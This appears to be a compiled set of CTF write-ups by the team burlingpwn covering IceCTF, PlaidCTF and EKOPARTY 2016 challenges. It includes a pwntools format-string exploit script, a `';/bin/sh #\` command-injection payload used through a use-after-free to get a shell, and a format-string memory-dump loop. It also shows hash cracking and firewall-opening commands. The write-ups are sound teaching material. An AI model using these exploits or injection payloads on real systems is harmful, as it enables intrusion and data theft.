<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-burlingpwn
description: CTF writeups and security challenges by burlingpwn.
---

# Writeups by burlingpwn

Source repository: `/repos/burlingpwn`

## Repository Index

- writeups/README.md
- writeups/IceCTF-2016/README.md
- writeups/PlaidCTF-2016/README.md
- writeups/PlaidCTF-2016/butterfly/README.md
- writeups/PlaidCTF-2016/unix_time_formatter/README.md
- writeups/IceCTF-2016/dear_diary/README.md
- writeups/IceCTF-2016/exposed/README.md
- writeups/IceCTF-2016/kitty/README.md
- writeups/IceCTF-2016/thor/README.md
- writeups/EKOPARTY-CTF-2016/Web/Super duper advanced attack/readme.md
- writeups/EKOPARTY-CTF-2016/Web/Url shortener/readme.md
- writeups/EKOPARTY-CTF-2016/Reversing/Back again/readme.md
- writeups/EKOPARTY-CTF-2016/Reversing/F#ck/readme.md
- writeups/EKOPARTY-CTF-2016/Reversing/JVM/readme.md
- writeups/EKOPARTY-CTF-2016/Reversing/Old times/readme.md
- writeups/EKOPARTY-CTF-2016/Reversing/RrEeGgEeXx/readme.md
- writeups/EKOPARTY-CTF-2016/Pwning/My first service I/readme.md
- writeups/EKOPARTY-CTF-2016/Pwning/Ultra baby/readme.md
- writeups/EKOPARTY-CTF-2016/Misc/Congested service/readme.md
- writeups/EKOPARTY-CTF-2016/Misc/X-Flag/readme.md
- writeups/EKOPARTY-CTF-2016/Forensics/Certified Excel Hacker/readme.md
- writeups/EKOPARTY-CTF-2016/Forensics/Damaged/readme.md
- writeups/EKOPARTY-CTF-2016/FBI/Metadata/readme.md

## Writeup Content


### File: writeups/IceCTF-2016/README.md

# burlingpwn writeups for IceCTF 2016
## [The Icelandic Hacking Competition](https://icec.tf/)
### 12. August - 26. August

__participating members:__ [int10h](https://github.com/brianmwaters), [mut3](https://github.com/mut3)

__challenges solved:__

|Challenge                      |Type       |Value|
|---                            |---        |---|
|[Kitty](kitty/)                |Web        |70|
|Smashing Profit                |Pwn        |60|
|[Dear diary](dear_diary/)      |Pwn        |60|
|[Exposed!](exposed/)           |Web        |60|
|[Thor's a hacker now](thor/)   |Misc       |55|
|Demo                           |Pwn        |55|
|Corrupt Transmission           |Forensics  |50|
|Flag Storage                   |Web        |50|
|RSA?                           |Crypto     |50|
|Time Traveler                  |Forensics  |45|
|Hidden in Plain Sight          |RE         |45|
|Toke                           |Web        |45|
|Complacent                     |Recon      |40|
|Search                         |Misc       |40|
|Alien Message                  |Crypto     |40|
|IRC I                          |Misc       |35|
|Move Along                     |Web        |30|
|Substituted                    |Crypto     |30|
|Rotated!                       |Crypto     |20|
|All your Base are belong to us |Misc       |15|
|Spotlight                      |Web        |10|
|Hello World!                   |Misc       |1|



### File: writeups/IceCTF-2016/dear_diary/README.md

dear_diary
==========

**Solved by:** [int10h](https://github.com/brianmwaters) and [mut3](https://github.com/mut3)

> We all want to keep our secrets secure and what is more important than our precious diary entries? We made this highly secure diary service that is sure to keep all your boy crushes and edgy poems safe from your parents. `nc diary.vuln.icec.tf 6501`

The binary has a pretty straightforward menu-based interface that lets you create objects and print them. We might be looking for a heap-based vulnerability here:

```
brian@katahdin:dear_diary$ ./dear_diary
-- Diary 3000 --

1. add entry
2. print latest entry
3. quit
> 1
Tell me all your secrets: ok!

1. add entry
2. print latest entry
3. quit
> 2
ok!

1. add entry
2. print latest entry
3. quit
> 3
brian@katahdin:dear_diary$
```

However, the binary doesn't like it if if any of our "entries" contain `n`'s:

```
brian@katahdin:dear_diary$ ./dear_diary
-- Diary 3000 --

1. add entry
2. print latest entry
3. quit
> 1
Tell me all your secrets: no way!
rude!
brian@katahdin:dear_diary$
```

The object allocation turned out to be stack-based, not heap-based, so no use after free here. I spent waaay too much time looking for some kind of overflow, but everything was buttoned up tight. Then I found it, staring me in the face, and it wasn't an overflow:

![IDA screenshot of format string vulnerability](format string vulnerability.png)

In case you can't read that, `printf` is being called with a single, user-controlled argument. This explains why the binary exits if any of our secrets contain the letter `n` - it's sanitizing the input against the `printf` `%n` specifier that can lead to arbitrary code execution!

That's okay though, because we don't need the `%n` specifier here anyway. The binary reads `flag.txt` into memory on startup and stores it somewhere in the data segment. The secrets are stored in `main`'s stack frame. We used two secrets - one containing the address of the flag (there was no PIE so this was known); the other containing a format string payload. The vulnerable `printf` call happens in a stack frame directly below `main` (which is where we stored the address of the flag), so we can get `printf` to read past all the crap we don't care about by making the payload a bunch of `%x`'s followed by a `%s` (the `%s` will read out the actual flag). I don't think we even used the debugger to find the right number of `%x`'s; we just kept adding more 'til it worked:

```
#!/usr/bin/env python2

from pwn import *
remote_host='diary.vuln.icec.tf'
remote_port=6501
context(arch='i386',os='linux')

def pwn():
  print "Beginning pwn!"
  address = p32(0x0804a0a0) # literally leave the memory address '0804a0a0'
  payload = "%x"*17+"%s" # clear 17 4-byte words and then the string at the 4
byte pointer
  child.recvuntil('>') # wait for prompt
  child.sendline('1') # choose new entry
  child.sendline(address)
  child.recvuntil('>')
  child.sendline('1')
  child.sendline(payload)
  child.recvuntil('>')
  child.sendline('2')
  print(child.recv())


child = remote(remote_host,remote_port)
pwn()
child.interactive()
```



### File: writeups/IceCTF-2016/exposed/README.md

## Exposed, web, 60 points

__Description__:

John is pretty happy with himself, he just made his first website! He used all the hip and cool systems, like NginX, PHP and Git! Everyone is so happy for him, but can you get him to give you the flag?


__Solver__: [int10h](https://github.com/brianmwaters) & [mut3](https://github.com/mut3)

This challenge was based on digging back through the git history. The repository was on the server so it could be cloned by doing.

```
git clone http://exposed.vuln.icec.tf/.git
```

We did a lot of manual digging around and reconstructing the repository from git objects ripped off the server, only to realized we could use the `git cat-file` command on the git objects and wrote this script.

```
#!/bin/sh

#git cloned this first
cd exposed.vuln.icec.tf
cd .git/objects
for i in */*; do f=$(echo $i | sed 's/\///'); git cat-file -p $f ; done | grep IceCTF
```

`git cat-file` renders the git object binaries as the versions of the files they represent this script output the flag along with a few decoys.

```
echo 'Hello World! IceCTF{secure_y0ur_g1t_repos_pe0ple}';
                    echo 'IceCTF{not_this_flag}';
IceCTF{this_isnt_the_flag_either}
```



### File: writeups/IceCTF-2016/kitty/README.md

## Kitty, web, 70 points

__Description__:

They managed to secure their website this time and moved the hashing to the server :(. We managed to leak this hash of the admin's password though! `c7e83c01ed3ef54812673569b2d79c4e1f6554ffeb27706e98c067de9ab12d1a`. Can you get the flag? kitty.vuln.icec.tf


__Solver__: [mut3](https://github.com/mut3)

This web challenge supplied a password hash and a login portal. Looking at the html of the login portal revealed some input validation on the password field.

```
<input id="password" class="u-full-width" name="password" placeholder="Password" required="" pattern="[A-Z][a-z][0-9][0-9][\?%$@#\^\*\(\)\[\];:]" type="password">
```

It seems there is a very limited range of valid passwords, one uppercase letter `[A-Z]`, one lowercase letter `[a-z]`, two digits `[0-9]`, and one special character from the set `?%$@#^*()[]:;` `[\?%$@#\^\*\(\)\[\];:]`. This means there are only are only `26*26*10*10*13 = 878800` possible passwords. A script could be hacked together to try to collide with the supplied hash, but why bother when a better tool exists?

It turns out the challenge name 'Kitty' was a hint to use [hashcat](https://hashcat.net/hashcat/), a password cracking tool, which makes short work of this SHA 256 hash when given the custom pattern for this password.

```
# hashcat --hash-type=1400 --custom-charset1='%#^*{}[];:?' -a 3  hash.txt ?u?l?d?d?1
Initializing hashcat v2.00 with 4 threads and 32mb segment-size...

Added hashes from file hash.txt: 1 (1 salts)
Activating quick-digest mode for single-hash

c7e83c01ed3ef54812673569b2d79c4e1f6554ffeb27706e98c067de9ab12d1a:Vo83*

All hashes have been recovered

Input.Mode: Mask (?u?l?d?d?1) [5]
Index.....: 0/1 (segment), 676000 (words), 0 (bytes)
Recovered.: 1/1 hashes, 1/1 salts
Speed/sec.: - plains, 565.99k words
Progress..: 566876/676000 (83.86%)
Running...: 00:00:00:01
Estimated.: --:--:--:--

```

Logging into the web portal with admin:Vo83* gave the flag `Your flag is: IceCTF{i_guess_hashing_isnt_everything_in_this_world}`



### File: writeups/IceCTF-2016/thor/README.md

## Thor's a hacker now, misc, 55 points

__Description__:

Thor has been staring at this for hours and he can't make any sense out of it, can you help him figure out what it is? [`thor.txt`](thor.txt)


__Solver__: [mut3](https://github.com/mut3)

This challenge gave a text file containing a hex dump. `xxd -r` reverses hex dumps into binary files.

```
# xxd -r thor.txt thor
# file thor
thor: lzip compressed data, version: 1
```

Lzip? the hexdump was of some obscure compression scheme.

```
# lzip -d thor
# file thor.out
thor.out: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, Exif Standard: [TIFF image data, little-endian, direntries=5, xresolution=74, yresolution=82, resolutionunit=2, software=GIMP 2.8.18], progressive, precision 8, 1600x680, frames 3
```

Of a JPEG.

```
mv thor.out thor.jpg
```

Containing the flag

![thor flag](thor.jpg)


#### Bonus Story about mut3 being stupid:
I actually got super stuck on this challenge because there's a gemfile utility tool named thor installed on my system, and thought this was a pwn hidden in a misc challenge for a bit.



### File: writeups/PlaidCTF-2016/README.md




### File: writeups/PlaidCTF-2016/butterfly/README.md

butterfly
=========

This challenge was a "pwnable" worth 150 points:

> Sometimes the universe smiles upon you. And sometimes, well, you just have to roll your  sleeves up and do [things yourself](https://github.com/burlingpwn/Writeups/raw/butterfly/PlaidCTF-2016/butterfly/butterfly_33e86bcc2f0a21d57970dc6907867bed). Running at butterfly.pwning.xxx:9999

Writeup by: [brianmwaters](https://github.com/brianmwaters)

Collaborators: [mut3](https://github.com/mut3)

Reversing
---------

Running the binary reveals this cryptic prompt:

```
brian@katahdin:butterfly$ ./butterfly_33e86bcc2f0a21d57970dc6907867bed
THOU ART GOD, WHITHER CASTEST THY COSMIC RAY?
```

When you type something, the program reveals that it calls ```mprotect```:

```
brian@katahdin:butterfly$ ./butterfly_33e86bcc2f0a21d57970dc6907867bed
THOU ART GOD, WHITHER CASTEST THY COSMIC RAY?
huh?
mprotect1: Cannot allocate memory
brian@katahdin:butterfly$
```

In case you don't know, ```mprotect``` is a function that changes the read/write/execute permissions of memory mappings, similarly to Unix file permissions. So far, so good.

Looking at the disassembly, ```main``` does a bounded read from ```stdin``` to a buffer at the top of the stack, and falls through to the following basic block on success:

```
  4007d8:       48 8d 3c 24             lea    rdi,[rsp]
  4007dc:       31 f6                   xor    esi,esi
  4007de:       31 d2                   xor    edx,edx
  4007e0:       e8 6b fe ff ff          call   400650 <strtol@plt>
  4007e5:       48 89 c3                mov    rbx,rax
  4007e8:       48 89 dd                mov    rbp,rbx
  4007eb:       48 c1 fd 03             sar    rbp,0x3
  4007ef:       49 89 ef                mov    r15,rbp
  4007f2:       49 81 e7 00 f0 ff ff    and    r15,0xfffffffffffff000
  4007f9:       be 00 10 00 00          mov    esi,0x1000
  4007fe:       ba 07 00 00 00          mov    edx,0x7
  400803:       4c 89 ff                mov    rdi,r15
  400806:       e8 55 fe ff ff          call   400660 <mprotect@plt>
  40080b:       85 c0                   test   eax,eax
  40080d:       75 5c                   jne    40086b <main+0xe3>
```

There's a few things going on here. First, it's using ```strtol``` to convert the input into a signed integer, doing some funky arithmetic on the result, and using that as the ```address``` argument to a call to ```mprotect``` with ```PROT_READ|PROT_WRITE|PROT_EXEC```. The effect of this is that, if we can account for the arithmetic, we should be able to set some page of memory to have RWX permissions.

I'll spare you the trouble and just tell you up front that the arithmetic is this:

```
address = (input >> 3) & 0xfffffffffffff000;
```

which is shifting off the 3 least significant bits of the input, and then masking the result to a page boundary. So, if, after the shift, we end up with an address that is in the middle of the page, the mask will give us the page's base address. (This is a pretty standard usage of ```mprotect```, actually.)

The question is, what about those 3 bits that we threw away? The next basic block provides the answer:

```
  40080f:       80 e3 07                and    bl,0x7
  400812:       41 be 01 00 00 00       mov    r14d,0x1
  400818:       b8 01 00 00 00          mov    eax,0x1
  40081d:       88 d9                   mov    cl,bl
  40081f:       d3 e0                   shl    eax,cl
  400821:       0f b6 4d 00             movzx  ecx,BYTE PTR [rbp+0x0]
  400825:       31 c1                   xor    ecx,eax
  400827:       88 4d 00                mov    BYTE PTR [rbp+0x0],cl
  40082a:       be 00 10 00 00          mov    esi,0x1000
  40082f:       ba 05 00 00 00          mov    edx,0x5
  400834:       4c 89 ff                mov    rdi,r15
  400837:       e8 24 fe ff ff          call   400660 <mprotect@plt>
  40083c:       85 c0                   test   eax,eax
  40083e:       75 37                   jne    400877 <main+0xef>
```

This takes the intermediate result from above (```input >> 3```, just before the mask), and uses it as the address for another funky operation. It will help if we use some variable names. How about
```
addr = input >> 3;
bit = input & 0x7;
```

The basic block then does ```*addr ^= bit;```. What this means is that we can flip a single bit at any address in memory, just by providing the right integer as input. The trick is finding the right bit.

The basic block then uses ```mprotect``` to set the page back to RX permissions.

Exploitation
------------

Rather than use our brains, we opted to write a script (```brutus.py```) to flip every single bit in the text segment and log the result. The output was a bit hard to parse, so we zeroed in on bits in the two most interesting instructions that occurred after the flip: the calls to ```mprotect``` and ```puts```.

We noticed that when we flipped one of the bits in the second ```mprotect``` call, the program cycled back up to somewhere in the initialization routines, and printed the cryptic message about cosmic rays again. This would allow us to flip more bits. The integer input that caused this to happen was 33571270. Try it yourself!

At this point, we had everything we needed. We grabbed a pretty basic local ```execve``` shellcode off [exploit-db](https://www.exploit-db.com/) and xored it with the beginning of the text segment at ```0x400000```. The 1's in the output were the bits we needed to flip. We also calculated the integer inputs corresponding to these bits.

We also turned a later instruction into a ```jmp 0x400000``` using the same technique. Finally, we needed to undo the loop by un-flipping that original bit, and the program would fall through to our ```jmp``` instruction. Pwnage would be ours!!!

```
brian@katahdin:butterfly$ ./exploit.py
33571270
WAS IT WORTH IT???
ls
butterfly
flag
wrapper
cat flag
PCTF{b1t_fl1ps_4r3_0P_r1t3}
^C
brian@katahdin:butterfly$
```

In summary, here's the overall structure of our exploit:
- Flip a bit that turns most of ```main()``` into an infinite loop.
- Flip all the bits that will transform the start of the text segment into our shellcode.
- Flip the bits that will transform a later instruction into a ```jmp``` into the shellcode.
- Un-flip the bit that caused the infinite loop.
- Capture the flag.

The title
---------
By the way, in case it wasn't obvious, the reference to cosmic rays in the programs' prompt is referring to the fact that cosmic rays can flip bits inside a computer (that's one reason servers use ECC RAM). Butterfly, though, that's a reference to [this](https://xkcd.com/378/) xkcd comic about programming using butterflies and cosmic rays: ![xkcd comic](https://imgs.xkcd.com/comics/real_programmers.png).



### File: writeups/PlaidCTF-2016/unix_time_formatter/README.md

# unix_time_formatter
### Pwnable (76 pts)

```
Converting Unix time to a date is hard, so Mary wrote a tool to do so.

Can you you exploit it to get a shell? Running at unix.pwning.xxx:9999
```

Writeup by: [mut3](https://github.com/mut3)

Collaborators: [brianmwaters](https://github.com/brianmwaters), [dillonb](https://github.com/dillonb)

*Disclaimer :We came at this without a really organized process, so take not that most of these discoveries and progressions came with more over caffeinated fiddling and experimenting than this writeup lets on.*

## Intro

For this challenge we were given [this binary](https://github.com/burlingpwn/writeups/tree/master/PlaidCTF-2016/unix_time_formatter/unix_time_formatter_9a0c42cadcb931cce0f9b7a1b4037c6b) which takes a user input date_format, time, & timezone then makes a call to `/bin/date` to print out the input time according to the given format and timezone.

### Normal Run
```
Welcome to Mary's Unix Time Formatter!
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
>1
Format: %c
Format set.
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
>2
Enter your unix time: 1234567890
Time set.
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
>3
Time zone: UTC
Time zone set.
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
>4
Your formatted time is: Fri 13 Feb 2009 11:31:30 PM UTC
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
>5
Are you sure you want to exit (y/N)? y
OK, exiting.
```

## Reversing

The first useful thing we found, after disassembling the binary was the existence of multiple environment checks for a debug flag, called `DEBUG` of course. Here's one of those checks:

```
400c4f:	e8 cc fc ff ff       	callq  400920 <getenv@plt>
```

After that we always started the binary with:

```
$ DEBUG=1 ./unix_time_formatter_9a0c42cadcb931cce0f9b7a1b4037c6b
```

This flag was a very helpful bit of assistance from PPP, as it output the command being run when we printed the time (option 4) and showed the memory pointers used in `strdup` and `free` calls.

Here is the useful DEBUG output per command:

### Format time

```
Format: %c
strdup(0x7fffd37cde78) = 0x1796420
Format set.
```

### Set TZ

```
Time zone: UTC
strdup(0x7fffd37cde78) = 0x1796440
Time zone set.
```

### Print formatted time

```
Your formatted time is: Running command: /bin/date -d @0 +'%c'
Thu 01 Jan 1970 12:00:00 AM UTC
```

### Exit

```
free(0x1796420)
free(0x1796440)
Are you sure you want to exit (y/N)? y
OK, exiting.
```

We honed in on the print formatted time command, that was where we could pop a shell. The call to `/bin/date` was run like this by the program:

```
system(/bin/date -d @[TIME] +'[FORMAT]')
```

Where `[TIME]` and `[FORMAT]` are user input. The time input was dead end in terms of command injection, giving it anything but an int would cause a seg fault when the print call was made. This left us the time format field, surrounded by single quotes, but any 1337 h4x0r worth their salt will know all we have to do is place a closing quote into our payload to escape these.

```
Format: ';/bin/sh #\
strdup(0x7ffcc3308678) = 0x1b17420
Format contains invalid characters.
free(0x1b17420)
```

Uh-oh, no shell, what went wrong? We went back into the disassembled program and found out that it ran some input validation on our time format input. Only the characters `%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^#` were allowed, and without a single quote, we were not successfully injecting straight into time format.

**Now what?**

There's input validation on time-format, but not on timezone. We found we could put anything we wanted into the timezone, but it wasn't included within the `system()` call, so what use was it? We weren't quite sure.

We went back to messing around with the binary in DEBUG mode, testing ideas, bumbling around. After some frustrating head->wall grinding, I noticed the key we had missed before, "Hey wait, the f\*\*\*ing thing **frees those pointers before exit**!" Eureka. When option 5 gets chosen, the memory `malloc()`'d by `strdup()` to store the TZ and format is freed before the user chooses wheter to exit the program or not. Brian had heard of double-free vulns and the undefined behavior they could cause. *(We now know it was just a use-after-free, but we freed twice.)* What a beautiful thing for somebody looking for a vulnerability to hear "undefined behavior," mmmm, tasty.

## Exploiting

Q: What happens after we free these pointers, but don't exit?

A: Wonderful, wonderful things :)

```
Welcome to Mary's Unix Time Formatter!
...
> 1
Format: %c
strdup(0x7ffcd354c5f8) = 0x1d36420
Format set.
...
> 3
Time zone: UTC   
strdup(0x7ffcd354c5f8) = 0x1d36440
Time zone set.
...
> 5
free(0x1d36420)
free(0x1d36440)
Are you sure you want to exit (y/N)? n
...
> 3
Time zone: UTC
strdup(0x7ffcd354c5f8) = 0x1d36440
Time zone set.
...
> 3       
Time zone: UTC
strdup(0x7ffcd354c5f8) = 0x1d36420
Time zone set.
```

There it is, we now have our format field pointing at `0x1d36420` but thanks to use-after-free we just wrote to that address with the TZ input. Time to pop a shell on the server.

## Pwning

```
$ nc unix.pwning.xxx 9999
Welcome to Mary's Unix Time Formatter!
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 1
Format: %c
Format set.
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 3
Time zone: ';/bin/sh #\
Time zone set.
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 5
Are you sure you want to exit (y/N)?
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 5
Are you sure you want to exit (y/N)?
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 3
Time zone: ';/bin/sh #\
Time zone set.
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 3
Time zone: ';/bin/sh #\
Time zone set.
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 4
Your formatted time is:
ls
flag.txt
unix_time_formatter
wrapper
cat flag.txt
PCTF{use_after_free_isnt_so_bad}
exit
```

## Wrapup

Flag: `PCTF{use_after_free_isnt_so_bad}`
Notes:
  * We now know we didn't need to double free, this is a use after free vulnerability
  * Our payload `';/bin/sh #\` probably didn't need the `#\`, but we left it so that the second `'` wouldn't create problems
  * We could have automated this, but it wasn't very time consuming to do manually, and this was our first time popping a shell, very exciting

Thanks to PPP for putting on PCTF.



### File: writeups/README.md

# Writeups
Post CTF Writeups



### File: writeups/EKOPARTY-CTF-2016/FBI/Metadata/readme.md

# Metadata - FBI 50

```
Help me to find some metadata!

https://silkroadzpvwzxxv.onion
```

Background music: [Bohemian Rhapsody](https://www.youtube.com/watch?v=fJ9rUzIMcZQ)

A hidden service with a certificate!?

![The flag](flag.png)



### File: writeups/EKOPARTY-CTF-2016/Forensics/Certified Excel Hacker/readme.md

# Certified Excel Hacker - Forensics 50

```
Can you wait for the answer?

Hint
Do not wait for it, it is already there :)

Attachment
for50_ed4b8625b6be1bd0.zip
```

It's an Excel file w/ a macro that seems to hang forever. The problem asks, "Can you wait for it?" But a hint was later added saying "Do not wait for it, it is already there :)" However, the VBA project inside the sheet is "locked," so we'll need to find a way in. Obviously, Excel has some way of running the code without the password, so this is some sort of obfuscation at best. I could not possibly explain how to break it any better than [this](https://stackoverflow.com/questions/1026483/is-there-a-way-to-crack-the-password-on-an-excel-vba-project).

Once in, we see the macro is doing a bunch of SHA1 and base 64 sixteen-something million times over:

```
Sub CALCULATE()
Dim z57fbbe9a55b7e76e8772bb12c27d0537, NOT_ANSWER
NOT_ANSWER = "NOTNOTNOTNOTNOTNOTNOTNOTNOTNOTNOTNOT"
For z57fbbe9a55b7e76e8772bb12c27d0537 = 1 To 16777216
answer = bfd9aaddb34d3018d0842fe01cd876ce2(answer)
Next z57fbbe9a55b7e76e8772bb12c27d0537
Hoja1.NOT_ANSWER.Text = "EKO{" + Replace(answer, "=", "") + "}"
End Sub
Public Function bfd9aaddb34d3018d0842fe01cd876ce2(ByVal sTextToHash As String)
Dim b5d3ce0d93bdc39075041314952e56a03 As Object, be07792f9d366fe5e26844e720f7fd830 As Object
Dim TextToHash() As Byte
Set b5d3ce0d93bdc39075041314952e56a03 = CreateObject("System.Text.UTF8Encoding")
Set be07792f9d366fe5e26844e720f7fd830 = CreateObject("System.Security.Cryptography.SHA1CryptoServiceProvider")
TextToHash = b5d3ce0d93bdc39075041314952e56a03.Getbytes_4(sTextToHash)
Dim bytes() As Byte
bytes = be07792f9d366fe5e26844e720f7fd830.ComputeHash_2((TextToHash))
bfd9aaddb34d3018d0842fe01cd876ce2 = bbdc49a038db5a02827fb9a3373d77989(bytes)
Set b5d3ce0d93bdc39075041314952e56a03 = Nothing
Set be07792f9d366fe5e26844e720f7fd830 = Nothing
End Function
Private Function bbdc49a038db5a02827fb9a3373d77989(ByRef arrData() As Byte) As String
Dim bc5197ca332c6a81c0e410b8010ffd7c1
Dim bde1a23ed20269f4573007d67e676a5e1
Set bc5197ca332c6a81c0e410b8010ffd7c1 = CreateObject("MSXML2.DOMDocument")
Set bde1a23ed20269f4573007d67e676a5e1 = bc5197ca332c6a81c0e410b8010ffd7c1.createElement("b64")
bde1a23ed20269f4573007d67e676a5e1.DataType = "bin.base64"
bde1a23ed20269f4573007d67e676a5e1.nodeTypedValue = arrData
bbdc49a038db5a02827fb9a3373d77989 = bde1a23ed20269f4573007d67e676a5e1.Text
Set bde1a23ed20269f4573007d67e676a5e1 = Nothing
Set bc5197ca332c6a81c0e410b8010ffd7c1 = Nothing
End Function
```

Honestly, rather than try and understand this horrible, obfuscated VB and all it's library calls, I just decided to estimate how long it would take the macro to complete. I changed the constant to someting smaller and timed it on my wristwatch. According to math, it would take around an hour too complete.

Yeah, I can wait for that.

`EKO{DCEUslnl7DeiLWSdCLi0l1fxdc8}`

However, this wasn't the right flag. At this point, I moved on to something less time-consuming for 50 points.

EDIT: [These guys](https://0day.work/ekoparty-ctf-2016-writeups/#forensics50) managed to figure it out; my interpretation of the above VB code was way off. Also, it sounds like they managed to "unlock" the macros w/ Libreoffice, without having to do the trick I linked to above.



### File: writeups/EKOPARTY-CTF-2016/Forensics/Damaged/readme.md

# Damaged - Forensics 75

```
All you have to do is to see this damaged image!

Attachment
for75_165560e4a08b23f7.zip 
```

We're given a broken BMP file. I can't open it with Eye of MATE, my normal system viewer.

I figured, why not try converting it to something else w/ ImageMagick (`convert damaged_image.bmp repaired_image.png`), and sure enough, ImageMagick doesn't care about the broken headers and outputs a valid PNG file:

![The flag](repaired_image.png)



### File: writeups/EKOPARTY-CTF-2016/Misc/Congested service/readme.md

# Congested service - Misc 100

```
Try to connect to the NULL service and retrieve the flag!

7e0a98bb084ec0937553472e7aafcf68ff96baf4.ctf.site 20000
(Please don't flood the service, it works as expected)

Hint
Find the adequate protocol, it is not TCP but D**P, find it with the title 
```

It's DCCP. `nc -Z 7e0a98bb084ec0937553472e7aafcf68ff96baf4.ctf.site 20000`. I hade to get out from behind my NAT and mess with iptables to get this to work. It sent the flag over the connection when I connected, just like TCP.



### File: writeups/EKOPARTY-CTF-2016/Misc/X-Flag/readme.md

# X-Flag - Misc 150

```
Can you see the flag?

http://f50bf71fa6dbc43f48fbb7e6ac749e4a7099b053.ctf.site:20000/
```

This one is a webapp that asks us to input an IP address to where the flag will be sent. So we'll have to get out in front of whatever NAT we're behind so that we have a legit address on the open Internet.

I first tried just running `tcpdump` on the JunOS machine I've got downstairs. JunOS is based on FreeBSD, so it's similar to Linux but sort-of two steps removed. I couldn't figure out which interface to use quick enough (there are a lot), so I dropped it and just went downstairs and plugged my laptop straight into the 'net. There's nothing like raw Internet, straight to the dome...

I went back to the web interface and requested the flag be sent to me. A SYN was sent to port 6000, (X11 remote desktop - old skool) so I punched a hole in my firewall (`sudo iptables -I INPUT 1 -p tcp --dport 6000 -j ACCEPT`) and stood up netcat (`nc -ll 6000`) as a quick-and-dirty way to accept connections. I requested the flag again. This time, a connection was made over port 6000, and Wireshark even recognized the incoming traffic as belonging to the X11 protocol. No flag, though. So I'll have to scratch netcat and actually stand up an X server, old skool. (This is all on Ubuntu 16.04 by the way.)

I hopped over to the Linux console (Ctrl-Alt-F1) and killed X. You have to do `systemctl stop lightdm` or similar these days, as just killing services doesn't work anymore now that systemd has ruinied Linux. Once you've done that, though, you can still fire up X the old-fashioned way: `startx -- -listen tcp`. I requested the flag again, and this time X sent an error message back to the client. After some Googling, I tried `xhost +`, which basically sets an "allow all" policy on the X server. Requested the flag again and got this nifty popup:

![An X11 window containing the flag](flag.png)

Don't you just love when you're one the open Internet, with your firewall down, running a service from the 80's (as root), and some hacker reaches out and runs some code on your machine?



### File: writeups/EKOPARTY-CTF-2016/Pwning/My first service I/readme.md

# My first service I - Pwning 100

```
Blacky is taking his first steps at C programming for embedded systems, but he makes some mistakes. Retrieve the secret key for access.

nc 9a958a70ea8697789e52027dc12d7fe98cad7833.ctf.site 35000
Alternate server: 7e0a98bb084ec0937553472e7aafcf68ff96baf4.ctf.site 35000 
```

Basically, this one asks you for a "secret key" over the network.
I hate to say it, but this one's almost exactly the same as [Chile](https://ctftime.org/writeup/4374) from H4ck1t this year. We netcat to `9a958a70ea8697789e52027dc12d7fe98cad7833.ctf.site:35000`, ostensibly to enter a "secret key", but it's pretty clear from messing around that the server is vulnerable to a format string bug (we aren't given a binary):

```
$ nc 9a958a70ea8697789e52027dc12d7fe98cad7833.ctf.site 35000
Welcome to my first service
Please input the secret key: %x
Invalid key: 0

Please input the secret key: %s  
Invalid key: (null)

Please input the secret key: ^C
```

Lets dump memory, 32 bits at a time:

```
$ cat getflag 
#!/bin/sh

for i in $(seq 0 54)
do
	payload=$(perl -e "print '%x' x $i . '%08x'")
	echo "$payload" | nc 9a958a70ea8697789e52027dc12d7fe98cad7833.ctf.site 35000 | head -n 2 | tail -n 1 | tail -c 9
done

```

Each payload looks like `%x%x%x%08x` or similar. We don't care about what's output by each `%x`; the last few commands in the pipeline throw away everything but the output of the `%08x`. We then get a memory dump, 4 bytes at a time:

```
$ ./getflag | tee log
00000000
0000000a
00000000
00000000
00000000
0000000a
00000000
454b4f7b
4c614269
67426566
3072647d
00000000
25782578
25782578
25782578
25782578
25782578
25782578
25782578
25782578
25782578
25782578
25782578
25782530
25303878
38780a00
0a000000
00000000
00000000
00000000
00000000
00000000
00000000
00000000
00000000
00000000
00000000
00000000
00000000
00000000
00000000
00000000
00000000
00000000
00000000
496e7661
6c696420
6b65793a
20257825
78257825
78257825
78257825
78257825
78257825
78257825
```

It's actually not a 100% faithful dump; each output is from a different run of the program and all the `7825`'s are actually `%x`'es which have clobbered whatever used to be there.

```
$ cat log | hex2bin


EKO{LaBigBef0rd}%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%0%08x8x

Invalid key: %x%x%x%x%x%x%x%x%x%x%x%x%x%
```

Good enough, I guess. 



### File: writeups/EKOPARTY-CTF-2016/Pwning/Ultra baby/readme.md

# Ultrababy - Pwning 25

```
Reach the flag function!

nc 9a958a70ea8697789e52027dc12d7fe98cad7833.ctf.site 55000

Attachment
pwn25_5ae6e58885e7cd75.zip 
```

The binary has three functions, `main`, `Bye`, and `Flag`. Here's what IDA has to say about `main`:

```
; Attributes: bp-based frame

; int __cdecl main(int argc, const char **argv, const char **envp)
public main
main proc near

buf= byte ptr -20h
fp= qword ptr -8

push    rbp
mov     rbp, rsp
sub     rsp, 20h
lea     rax, Bye
mov     [rbp+fp], rax
mov     rax, cs:stdin@@GLIBC_2_2_5
mov     ecx, 0          ; n
mov     edx, 2          ; modes
mov     esi, 0          ; buf
mov     rdi, rax        ; stream
call    setvbuf
mov     rax, cs:__bss_start
mov     ecx, 0          ; n
mov     edx, 2          ; modes
mov     esi, 0          ; buf
mov     rdi, rax        ; stream
call    setvbuf
